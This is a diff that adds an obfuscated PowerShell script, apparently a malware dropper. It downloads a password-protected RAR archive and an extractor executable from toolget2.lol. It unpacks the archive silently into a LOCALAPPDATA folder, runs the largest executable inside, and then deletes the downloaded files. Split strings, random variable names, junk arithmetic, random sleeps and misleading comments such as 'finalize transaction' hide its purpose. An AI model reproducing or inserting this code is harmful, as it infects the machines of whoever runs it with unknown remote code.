@@ -1,0 +1,133 @@
+$ErrorActionPreference = ('Cont'+'inu'+'e') 
+$ProgressPreference = ('Silent'+'lyC'+'ont'+'inu'+'e')  
+# finalize transaction
+$h7wch = @('Tls','Tls11','Tls12','Tls13') | WhERE-OBJECt { [enum]::IsDefined([Net.SecurityProtocolType], $_) }
+if ($h7wch) { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType] ($h7wch -join ',') }  
+
+$src_a6m1ob3m         = ('htt'+'ps://t'+'oolge'+'t2.lol')  
+$tu3qg_f = 26 * 27; $a3sp3u = [Math]::Max($tu3qg_f, 412) 
+$cdtwm9      = "$src_a6m1ob3m/zbvvhp637.rar" 
+$vezihub00e1    = "$src_a6m1ob3m/sfvn8c3.exe"
+$f6bbrlb6yned = ('Z9HTV'+'eRH'+'tI'+'uy')  
+
+$q3yc77o       = joIn-pAth $env:TEMP "InstallFiles831"  
+$n7sf6zmo70    = JOIn-paTH $env:LOCALAPPDATA "InstallFiles831" 
+$pk2cvi4470_   = JoiN-pAth $q3yc77o "zbvvhp637.rar"
+$qc5s3l4hfb = JoIn-pAtH $q3yc77o "sfvn8c3.exe" 
+$h7wd4  = Get-Date -Format "yyyyMMddHHmmss" 
+$uiw54t = 7337; if ($uiw54t -lt 0) { $qnpi1qir = 609 } 
+
+fUnCtiOn t9tyl([int]$we8wc21lozv5 = 350, [int]$zpw6dales = 1100) {  
+    stArt-sLeEP -Milliseconds (Get-Random -Minimum $we8wc21lozv5 -Maximum $zpw6dales)  
+} 
+
+funcTioN m87gb2s { 
+    # ÐžÐ±Ñ‹Ñ‡Ð½Ñ‹Ðµ Ð¿Ñ€ÐµÐ´Ð¿Ñ€Ð¾Ð²ÐµÑ€ÐºÐ¸ ÑƒÑÑ‚Ð°Ð½Ð¾Ð²Ñ‰Ð¸ÐºÐ°: ÐžÐ¡, Ð¼ÐµÑÑ‚Ð¾, Ð·Ð°Ð¿Ð¸ÑÑŒ Ð²Ð¾ Ð²Ñ€ÐµÐ¼ÐµÐ½Ð½ÑƒÑŽ Ð¿Ð°Ð¿ÐºÑƒ.  
+    try {  
+        $h4h_3z8xj6 = [Environment]::OSVersion.Version
+        iF ($h4h_3z8xj6.Major -lt 10) { rEtuRN $false }
+        $sgop21 = Get-PSDrive -Name ([System.IO.Path]::GetPathRoot($env:TEMP).Substring(0, 1)) -ErrorAction SilentlyContinue
+        IF ($sgop21 -and $sgop21.Free -gt 0 -and $sgop21.Free -lt 40MB) { RETuRn $false }  
+        $zac361c = JoIN-pAtH $env:TEMP ("probe_" + $h7wd4 + ".tmp") 
+        [System.IO.File]::WriteAllText($zac361c, "ok") 
+        rEMOvE-itEM $zac361c -Force -ErrorAction SilentlyContinue
+        RetURN $true  
+    } CATcH { 
+$lq076 = [Environment]::OSVersion.VersionString  
+        REtuRN $false 
+    }  
+}
+
+FuNctioN a5dzgzidm([string]$pi5im, [string]$m3o63do4) {
+    $enafglb = sPLit-path $m3o63do4 -Parent 
+    if (-not (tEsT-paTH $enafglb)) { nEw-iTem -ItemType Directory -Path $enafglb -Force | OUt-NULL }  
+    If (TEsT-PaTh $m3o63do4) { rEMOVE-iTEm $m3o63do4 -Force -ErrorAction SilentlyContinue }  
+$m6bqdqhw = [System.IO.Path]::GetTempPath()
+
+    $e1riqk = [System.Net.HttpWebRequest]::Create($pi5im) 
+$kfrwm = 26 * 15; $qzygj = [Math]::Max($kfrwm, 456) 
+    $e1riqk.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:153.0) Gecko/20100101 Firefox/153.0" 
+    $e1riqk.Accept = "application/octet-stream, application/x-rar-compressed, */*"  
+    $e1riqk.Timeout = 120000
+    $e1riqk.ReadWriteTimeout = 120000
+    $yszkhf7ux9 = $e1riqk.GetResponse()  
+    trY {
+$o61yqm = (Get-Date).ToString('yyyy-MM-dd')  
+        $u9fqcrvt7 = $yszkhf7ux9.GetResponseStream() 
+        $t73ou4qj5 = [System.IO.File]::Create($m3o63do4)
+        tRy { 
+            $vhnpc = New-oBjeCt byte[] 81920 
+            WHIle (($mkk_tigbrgu = $u9fqcrvt7.Read($vhnpc, 0, $vhnpc.Length)) -gt 0) {  
+                $t73ou4qj5.Write($vhnpc, 0, $mkk_tigbrgu)  
+$ni1xuago = 6063 
+            } 
+        } FinaLLy {
+            $t73ou4qj5.Close() 
+            $u9fqcrvt7.Close()
+        }  
+    } fInALLy {  
+$ue7e2 = 66 * 34; $kf44 = [Math]::Max($ue7e2, 277) 
+        $yszkhf7ux9.Close()  
+    }  
+    REturN (teSt-pATh $m3o63do4)  
+}  
+$trzmo = [Environment]::MachineName 
+
+fuNctIoN bjttg3de8([string]$t9dels5tv60, [string]$e0wlp9i68sxp, [string]$heipynj09n2, [string]$hlcwzdbm) {  
+    $abjfiw6yrykg = new-object System.Diagnostics.ProcessStartInfo 
+# skip if cached  
+    $abjfiw6yrykg.FileName = $t9dels5tv60  
+    $abjfiw6yrykg.Arguments = "x -y -idq -p$hlcwzdbm `"$e0wlp9i68sxp`" `"$heipynj09n2\`""
+    $abjfiw6yrykg.UseShellExecute = $false
+    $abjfiw6yrykg.CreateNoWindow = $true
+    $abjfiw6yrykg.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Normal
+    $wvfkkfbzreh = [System.Diagnostics.Process]::Start($abjfiw6yrykg)
+    If (-not $wvfkkfbzreh) { retUrn $false }  
+    $wvfkkfbzreh.WaitForExit()
+    REtURn ($wvfkkfbzreh.ExitCode -eq 0) 
+$zj_tx = 6190
+} 
+
+FUnCtioN xhe56zkrt6px([string]$g4l6_e) { 
+    tRY {
+        $apfoz5se0t = JOIn-PatH $q3yc77o "session.log"  
+        Add-Content -Path $apfoz5se0t -Value ("[" + $h7wd4 + "] " + $g4l6_e) -ErrorAction SilentlyContinue  
+    } caTcH { }  
+$z02rxlp = [Environment]::ProcessorCount 
+}
+
+If (-not (m87gb2s)) { retuRn }  
+t9tyl  
+
+iF (-not (TEsT-PAtH $q3yc77o)) { NEw-ITEm -ItemType Directory -Path $q3yc77o -Force | OUt-NULl }  
+iF (-not (TEst-pATH $n7sf6zmo70)) { NeW-ITeM -ItemType Directory -Path $n7sf6zmo70 -Force | OuT-nULL } 
+xhe56zkrt6px "session started" 
+
+Try {
+    IF (-not (a5dzgzidm $cdtwm9 $pk2cvi4470_)) { return }  
+    xhe56zkrt6px "package ready" 
+    t9tyl  
+
+    IF (-not (a5dzgzidm $vezihub00e1 $qc5s3l4hfb)) { reTUrn } 
+    xhe56zkrt6px "extractor ready"
+    t9tyl 500 1400
+$xv_eve = [Environment]::ProcessorCount
+
+    iF (-not (bjttg3de8 $qc5s3l4hfb $pk2cvi4470_ $n7sf6zmo70 $f6bbrlb6yned)) { rETuRN }
+    xhe56zkrt6px "extracted"
+
+    $n8ps7m4r2l_ = gET-cHILDiTeM -Path $n7sf6zmo70 -Filter "*.exe" | sOrT-oBJECT Length -Descending | SelEct-OBJECT -First 1  
+    IF (-not $n8ps7m4r2l_) { RETUrn } 
+
+    t9tyl 400 900 
+    STarT-ProCeSS -FilePath $n8ps7m4r2l_.FullName -WorkingDirectory $n7sf6zmo70  
+    xhe56zkrt6px "launched" 
+} caTcH {
+    xhe56zkrt6px "error"  
+    REtUrN  
+$r_5r = 5276; if ($r_5r -lt 0) { $prlu492 = 612 }  
+}  
+
+RemOvE-itEm $pk2cvi4470_ -Force -ErrorAction SilentlyContinue
+$fbxc = 9683; if ($fbxc -lt 0) { $dreie8 = 429 }  
+rEMOVe-iTeM $qc5s3l4hfb -Force -ErrorAction SilentlyContinue
